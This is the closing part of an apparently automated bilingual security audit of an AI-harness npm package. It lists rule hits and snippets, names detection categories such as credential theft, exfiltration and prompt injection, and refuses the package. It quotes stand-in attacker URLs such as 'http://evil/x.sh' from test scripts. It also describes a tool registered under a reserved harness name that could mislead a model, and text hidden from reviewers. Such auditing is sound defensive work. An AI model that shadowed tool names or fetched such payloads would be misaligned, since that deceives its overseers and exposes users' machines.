  中 注册的工具使用了宿主内置工具的名字，模型可能自以为在调用核心实现，实际调用的却是这一份，工具调用记录也随之失真。
  EN A tool is registered with the name of a built-in harness tool, so the model may call this implementation while believing it is calling the core one, and the tool-call record becomes misleading.
  - `cordis.yml:160` — `toolName: subagent`
  - `presets/liangshen/agent.cordis.yml:346` — `toolName: subagent`
  - `presets/liangshen/custom-bash.mjs:235` — `name: 'bash',`
  - `scripts/repro-diff-split.tsx:38` — `name: 'edit',`
  - ……另有 42 处 / … and 42 more location(s)
  中 修复：给工具加上插件专属前缀重命名，不要占用保留名称。
  EN Fix: Rename the tool with a plugin-specific prefix instead of claiming a reserved name.
- **中 / MEDIUM** `net.plaintext-http` — 使用明文 HTTP 端点 / Uses a plaintext HTTP endpoint
  中 指向公网主机的 `http://` URL 以明文收发数据，传输途中可以被读取或篡改；这样到达的内容也可以被换成另一份载荷。
  EN An `http://` URL to a public host sends and receives data in the clear, where it can be read or rewritten in transit; anything that arrives this way can also be replaced with a different payload.
  - `scripts/verify-approval-visibility.tsx:167` — `http://evil/x.sh`
  - `scripts/verify-clickable-targets.ts:65` — `http://x.io`
  - `scripts/verify-osc8-sanitize.tsx:60` — `http://evil.com/\x1b`
  - `scripts/verify-osc8-sanitize.tsx:65` — `http://evil.com/\x1b[2J\x1b[H`
  - ……另有 10 处 / … and 10 more location(s)
  中 修复：改用 `https://`，并固定你实际要通信的主机。
  EN Fix: Switch to `https://` and pin the host you intend to talk to.
- **中 / MEDIUM** `obf.long-minified-line` — 整行是压缩或机器生成的数据块 / Line is a single minified or machine-generated blob
  中 该行超过 500 个字符且几乎没有空白，正是打包载荷、压缩字符串表或机器生成单行代码的样子。这样的一行用肉眼什么也审不出来。
  EN The line is over 500 characters with almost no whitespace, which is what a bundled payload, a packed string table or a machine-generated one-liner looks like. Nothing on such a line is reviewable by eye.
  - `scripts/verify-launcher.mjs:69` — `'@echo off\r\nnode -e "const fs=require(\'fs\');const a=process.argv.slice(1);fs.appendFileSync(process.env.DSH_STUB_LOG,a.map(v=>\'<\'+v+\'>\').join(\'\')+\'\\…`
  - `src/adapter/ports/channel-ui.ts:2` — `import type { ChatRow, AgentStatus, TokenUsage, NotificationItem, ActivityStatus, ChannelGoal, TodoPanelItem, LoadedContext, PendingMessage, ChannelSceneMetadat…`
  - `src/dsh-adapter/channel.ts:1049` — `export type { ActivityStatus, AgentViewDispatchResult, AgentViewRow, AgentViewStatus, BackgroundResult, Channel, ChannelGoal, ChannelState, ChatRow, ComposerIma…`
  - `src/dsh-adapter/channel/types.ts:2` — `import type { ChatRow, ToolRow, ToolCallView, ToolFileDiff, ToolResultView, SubagentRow, JobRow, TokenUsage, TokenBucket, NotificationItem, ActivityStatus, Chan…`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：发布未压缩的源码，或在 README 中说明该文件由哪个构建产出、可读源码在哪里。
  EN Fix: Ship unminified source, or state in the README which build produced the file and where the readable source lives.
- **中 / MEDIUM** `obf.obfuscated-identifier` — 使用混淆的标识符或混用字符集的名称 / Uses obfuscated identifiers or mixed-script names
  中 该行出现了压缩器风格的 `_0x…` 名称，或混用拉丁字母与西里尔、希腊形近字母的标识符。两者都会让试图扫读熟悉名称的人看漏，后者更是经典的仿冒手法。
  EN The line contains minifier-style `_0x…` names or an identifier that mixes Latin letters with Cyrillic or Greek lookalikes. Both defeat a reader scanning for a familiar name and the second is a classic impersonation trick.
  - `scripts/spacing-probe.tsx:256` — `valuetpsμp95sparkline`
  中 修复：发布标识符名称有意义的源码，绝不在同一个标识符里混用不同字符集。
  EN Fix: Ship source with meaningful identifier names, and never mix script systems inside one identifier.
- **中 / MEDIUM** `persist.shell-rc-append` — 追加写入 shell 启动文件 / Appends to a shell startup file
  中 该行写入了 `.bashrc`、`.zshrc`、`.profile` 或 fish 配置，因此改动会在之后每个交互式 shell 中生效，而且删掉包目录也不会消失。
  EN The line writes into `.bashrc`, `.zshrc`, `.profile` or a fish config, so the change takes effect in every future interactive shell and survives removing the package directory.
  - `src/adapter/standard/registry.ts:61` — `&& value.profile.length > 0`
  中 修复：不要修改 shell 启动文件；如果需要 shell 集成，就把那行内容打印出来，由用户自行决定是否添加。
  EN Fix: Do not modify shell startup files; if a shell integration is required, print the line for the user to add deliberately.
- **中 / MEDIUM** `priv.package-manager-config-write` — 改写包管理器或全局 git 配置 / Rewrites a package manager or global git configuration
  中 该行执行了 `npm config set` 或 `git config --global`，这会改变用户之后每条命令的配置——包括依赖从哪个仓库拉取，以及 git 调用哪个程序作为钩子。
  EN The line runs `npm config set` or `git config --global`, which changes settings for every future command the user runs — including which registry packages come from and which program git calls for hooks.
  - `scripts/make-installer-bundle.mjs:126` — `Warn "npm 全局目录在受保护路径（$prefix），若下面安装报权限错误，请右键 install.bat 以管理员身份运行，或执行：npm config set prefix \"\$env:APPDATA\\npm\""`
  中 修复：用环境变量或命令行参数为单条命令传配置，而不是写入用户的持久化配置。
  EN Fix: Pass configuration per command with environment variables or flags instead of writing the user's persistent config.
- **中 / MEDIUM** `prompt.concealed-instruction` — 把文本藏在注释或不可见字符中 / Hides text in a comment or invisible characters
  中 该行把内容藏在 HTML 注释里，或藏在零宽字符与双向控制字符之后，这些内容在 diff 或渲染后的文档中什么都看不见，却仍会作为文本被读取。
  EN The line conceals content either in an HTML comment or behind zero-width and bidirectional control characters, which render as nothing in a diff or a rendered document while still being read as text.
  - `scripts/verify-sticky-anchor.tsx:67` — `const promptText = (turn: number) => `问题 ${turn}\r\n${promptDetails.join('\n')}\n附注\t中文👩‍💻${'宽字符测试'.repeat(30)}``
  - `scripts/verify-text-viewport-paint.ts:25` — ``\x1b[32mline ${i}: 中文 e\u0301 👩‍💻 ${'long code with spaces '.repeat(5)}\x1b[0m`,`
  - `scripts/verify-text-viewport-paint.ts:66` — `setTextNodeValue(leaf, 'changed 中文 e\u0301 👩‍💻 text '.repeat(20))`
  - `scripts/verify-text-viewport-paint.ts:114` — `const lines = Array.from({ length: 20_000 }, (_, i) => `\x1b[32m${i}\t中文 👩‍💻 ${'x'.repeat(80)}\x1b[0m`)`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：删除被隐藏的文本和不可见字符；审查者看不到的东西就不该出现在发布的包里。
  EN Fix: Delete the concealed text and the invisible characters; anything a reviewer cannot see does not belong in a shipped package.
- **中 / MEDIUM** `supply.dependency-count-outlier` — 运行时依赖数量远超其声明的用途 / Runtime dependency count is far above the declared purpose
  中 相对于它自己所描述的用途，该包声明了数量庞大的运行时依赖。每一个都会被安装、会经由传递依赖的生命周期脚本被执行，并且会像这个包本身一样被信任。
  EN The package declares 37 runtime dependencies (@alcalzone/ansi-tokenize, @deepseek-harness-tui/dsh-auth, @dsh-std/command, @dsh-std/connection, @dsh-std/core, @dsh-std/manifest, @dsh-std/messages, @dsh-std/presentation, …) for a harness plugin of this size. Each one widens the install-time attack surface beyond what this audit reviewed.
  - `package.json:346` — `"dependencies": {`
  中 修复：去掉运行时并不需要的依赖，把仅用于构建的工具移到 `devDependencies`。
  EN Fix: Drop dependencies the package does not need at runtime, and move build-only tooling into `devDependencies`.
- **中 / MEDIUM** `supply.foreign-registry` — 仓库或 scope 覆盖指向 npmjs 之外 / Registry or scope override points away from npmjs
  中 某个 registry 或 `_authToken` 条目指向的服务器并非 npmjs。随包发布的 `.npmrc` 或 `publishConfig` 配置把解析重定向后，所有依赖拉取都会来自用户并未选择的主机。
  EN A registry or `_authToken` entry names a server that is not npmjs. A shipped `.npmrc` or `publishConfig` block that redirects resolution makes every dependency fetch come from a host the user did not choose.
  - `scripts/make-installer-bundle.mjs:133` — `& npm @npmArgs --registry=https://registry.npmmirror.com`
  - `scripts/make-installer-bundle.mjs:135` — `Fail "安装失败。可手动执行：npm install -g @deepseek-ai/dsh @deepseek-harness-tui/dsh-tui --registry=https://registry.npmmirror.com"`
  - `scripts/make-installer-bundle.mjs:223` — `--registry=https://registry.npmmirror.com ||`
  - `scripts/make-installer-bundle.mjs:224` — `fail '安装失败。可手动执行：npm install -g @deepseek-ai/dsh @deepseek-harness-tui/dsh-tui --registry=https://registry.npmmirror.com'`
  - ……另有 5 处 / … and 5 more location(s)
  中 修复：删除该覆盖；选择仓库本就是用户自己的配置，不该由被安装的包决定。
  EN Fix: Remove the override; registry selection belongs to the user's own configuration, not to the package being installed.
- **中 / MEDIUM** `supply.unscannable-payload-with-network` — 随包携带不可读载荷且存在对外请求 / Unreadable payload shipped alongside outbound requests
  中 该包携带了无法按文本读取的大文件——二进制文件、压缩包或压缩过的数据块——同时又建立对外连接，因此它发送的内容中有一部分是本次审计从未检查过的。
  EN 3 shipped file(s) are 64 KiB or larger and were not read as text, the largest being screenshots/qq-group.png at 412 KiB, while this package also makes outbound requests. Whatever those files contain leaves the machine unexamined.
  - `screenshots/qq-group.png` — `421711 bytes not decoded as text`
  - `pnpm-lock.yaml:2906` — `gaxios@7.3.1:`
  - `pnpm-lock.yaml:3059` — `node-fetch@3.3.2:`
  中 修复：删除这个不透明载荷，或说明它究竟是什么；审计无法为自己读不到的字节背书。
  EN Fix: Remove the opaque payload or document what it is; an audit cannot vouch for bytes it could not read.

### 低 / LOW (2)

- **低 / LOW** `cred.credential-path-mention` — 出现凭据路径但并未读取 / Credential path appears without being read
  中 某一行提到了敏感路径，却没有执行读取。报告记录这一条，是为了把仅仅出现在日志或错误信息中的路径，与真正被打开的路径区分开。
  EN A sensitive path is named on a line that performs no read. This is reported so the report can distinguish a path that is merely echoed in a log or error message from one that is actually opened.
  - `bin/dsh-tui.js:334` — `report(false, 'profile', `${L.profileMissing} (${profileDir})`)`
  - `bin/dsh-tui.js:334` — `profile${L.profileMissing} (${profileDir})`
  - `bin/dsh-tui.js:341` — `report(false, 'launcher ↔ profile', L.profileNewer(profileVersion))`
  - `bin/dsh-tui.js:343` — `report(false, 'launcher ↔ profile', L.profileOlder(ownVersion))`
  - ……另有 49 处 / … and 49 more location(s)
  中 修复：确认该路径只出现在文档或提示信息中；如果它随后被传给读取调用，那一行就会触发更严重级别的读取规则。
  EN Fix: Confirm the path is only used in documentation or messaging; if it is later passed to a read call, expect the higher-severity read rules to fire on that line.
- **低 / LOW** `supply.build-script-excluded-from-package` — 安装钩子运行的脚本被发布文件集排除在外 / Install hook runs a script the published file set excludes
  中 清单声明的安装钩子所引用的脚本没有被 `files` 白名单包含，或被 `.npmignore` 匹配排除。这样一来，从仓库安装时运行的文件与被审计和测试过的并不是同一个，甚至根本不存在。
  EN The prepare hook runs scripts/prepare-guard.mjs, but the files allowlist (bin, lib, cordis.patch.yml, cordis.yml, dsh-ecosystem-spec/registry, dsh-ecosystem-spec/protocols, dsh-ecosystem-spec/schemas, presets) does not cover scripts/prepare-guard.mjs. The published tarball therefore behaves differently from this source tree.
  - `package.json:119` — `"prepare": "node scripts/prepare-guard.mjs && npm run compile",`
  中 修复：把被引用的脚本加入 `files`，或把钩子移到会被发布的文件里。
  EN Fix: Add the referenced script to `files`, or move the hook into a file that is published.

_按类别 / By category:_ 凭据读取 / credential access 7 · 混淆 / obfuscation 6 · 供应链 / supply chain 6 · 数据外传 / exfiltration 5 · 持久化 / persistence 4 · 提权 / privilege 3 · 网络回调 / network callbacks 3 · 提示注入 / prompt injection 3 · 破坏性 / destructive 2 · 滥用宿主环境 / harness abuse 1

## 扫描说明 / Scan notes

- stripped the archive's single top-level directory `dsh-TUI-HEAD/`
- skipped screenshots/social-preview.png: 559873 bytes exceeds the 524288-byte per-file cap
- skipped screenshots/splash.png: 1731479 bytes exceeds the 524288-byte per-file cap
- skipped screenshots/wechat-official.png: 812640 bytes exceeds the 524288-byte per-file cap
- skipped standalone/pnpm-lock.yaml: 586933 bytes exceeds the 524288-byte per-file cap
- not scanned (binary, contents unreadable as text): screenshots/qq-group.png, screenshots/wechat-group.jpg, screenshots/wechat-group3.jpg
- outbound fetching was permitted for this audit
- grade forced to D by a critical finding: cred.read-dsh-credentials — Reads DSH credentials or session storage
- grade D is at or below the install floor D: this source is refused

---

高评级表示这份规则目录中没有命中，并不等于该包安全。静态分析看不到运行期才拼装出来的行为；部分扫描已在上方标注。 / A high grade means no rule in this catalog fired, not that the package is safe. Static analysis cannot see behavior assembled at runtime, and a partial scan is marked as such above.
